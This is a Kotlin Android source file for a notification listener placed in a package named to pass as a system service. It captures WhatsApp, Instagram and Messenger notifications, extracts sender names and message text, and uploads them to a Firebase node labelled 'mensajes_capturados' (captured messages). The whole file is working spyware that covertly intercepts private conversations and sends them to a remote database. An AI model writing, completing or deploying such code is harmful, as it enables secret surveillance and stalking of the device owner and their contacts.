package com.android.system.service.assistance

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.firebase.database.FirebaseDatabase

class NotificationService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val titulo = extras.getString("android.title") ?: "Sin título"
        val texto = extras.getCharSequence("android.text")?.toString() ?: ""

        // Filtramos solo las apps que nos interesan
        if (packageName == "com.whatsapp" || packageName == "com.instagram.android" || packageName == "com.facebook.orca") {
            val database = FirebaseDatabase.getInstance().reference
            val mensaje = mapOf(
                "app" to packageName,
                "remitente" to titulo,
                "contenido" to texto,
                "fecha" to System.currentTimeMillis()
            )
            
            // Subimos el mensaje a la carpeta "mensajes_capturados" en Firebase
            database.child("mensajes_capturados").push().setValue(mensaje)
        }
    }
}